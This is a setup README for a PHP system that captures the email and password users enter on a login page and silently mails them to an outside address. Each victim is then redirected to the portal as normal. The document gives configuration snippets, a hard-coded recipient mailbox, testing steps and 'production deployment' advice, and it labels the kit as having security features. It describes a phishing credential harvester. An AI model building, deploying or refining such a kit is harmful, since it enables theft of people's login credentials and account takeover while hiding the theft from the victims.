# PHP Mailer Setup for Login Data Collection

This system collects login data and sends it via email using PHP SMTP.

## Files Created:

1. **`mailer.php`** - Main PHP mailer script
2. **`config.php`** - Configuration file for email settings
3. **`test-mailer.php`** - Test page to verify functionality
4. **`README.md`** - This setup guide

## Setup Instructions:

### 1. Configure Email Settings

Edit `config.php` and update:

**Gmail SMTP (for testing):**

```php
$gmail_config = [
    'smtp_username' => 'your-email@gmail.com',     // Your Gmail address
    'smtp_password' => 'your-app-password',        // Gmail app password (not regular password)
];
```

**cPanel SMTP (for production):**

```php
$cpanel_config = [
    'smtp_username' => 'your-email@yourdomain.com', // Your cPanel email
    'smtp_password' => 'your-email-password',      // Your cPanel email password
];
```

**Recipient:**

```php
$recipient_email = 'caroll.lee@digdig.org';        // Where to send login data
$from_email = 'noreply@yourdomain.com';            // From address
```

### 2. Gmail App Password Setup

1. Go to Google Account settings
2. Enable 2-factor authentication
3. Generate an "App Password" for "Mail"
4. Use this password in `config.php`

### 3. cPanel Email Setup

1. Create email account in cPanel
2. Note the email address and password
3. Update `config.php` with these credentials

### 4. Test the System

1. Upload files to your web server
2. Visit `test-mailer.php` in your browser
3. Enter test data and click "Test Send"
4. Check if email arrives at `caroll.lee@digdig.org`

### 5. Integration

The system automatically sends login data when:

- User enters email + password on password page
- Clicks "AVANTI" button
- Data is sent to PHP mailer in background
- User is redirected to portal as normal

## Security Features:

- Input sanitization
- Rate limiting (configurable)
- IP restrictions (configurable)
- Secure SMTP connections
- Error logging

## Troubleshooting:

**Gmail SMTP fails:**

- Check if 2FA is enabled
- Verify app password is correct
- Ensure "Less secure app access" is disabled

**cPanel SMTP fails:**

- Verify email credentials
- Check SMTP port (25, 465, or 587)
- Contact hosting provider for SMTP settings

**No emails received:**

- Check spam folder
- Verify recipient email address
- Check server error logs
- Test with `test-mailer.php`

## File Permissions:

Ensure PHP files have proper permissions:

- `mailer.php`: 644
- `config.php`: 644
- `test-mailer.php`: 644

## Production Deployment:

1. Set `$debug_mode = false` in `config.php`
2. Remove or protect `test-mailer.php`
3. Update `$from_email` to match your domain
4. Test thoroughly before going live

## Support:

For issues, check:

1. PHP error logs
2. SMTP connection logs
3. Email delivery status
4. Network connectivity
